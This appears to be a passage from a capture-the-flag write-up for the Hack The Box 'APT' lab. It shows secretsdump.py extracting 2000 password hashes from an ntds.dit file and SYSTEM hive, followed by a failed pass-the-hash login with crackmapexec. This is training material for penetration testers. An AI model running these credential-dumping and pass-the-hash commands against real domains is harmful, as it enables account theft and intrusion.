# NTDS



#### Dump Hashes <a href="#dump-hashes" id="dump-hashes"></a>

`secretsdump.py` will take the System hive and the `ntds.dit` file and dump that hashes. There are a ton of them.

I’ll save it to a file, and `grep` to get just the hashes, and there are 2000:

```
oxdf@parrot$ secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump
oxdf@parrot$ grep ':::' backup_ad_dump | wc -l
2000
```



Logging in with `crackmapexec` and `psexc.py`, and both returned invalid credentials:

```
oxdf@parrot$ crackmapexec smb dead:beef::b885:d62a:d679:573f -H 2b576acbe6bcfda7294d6bd18041b8fe -u administrator
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
```
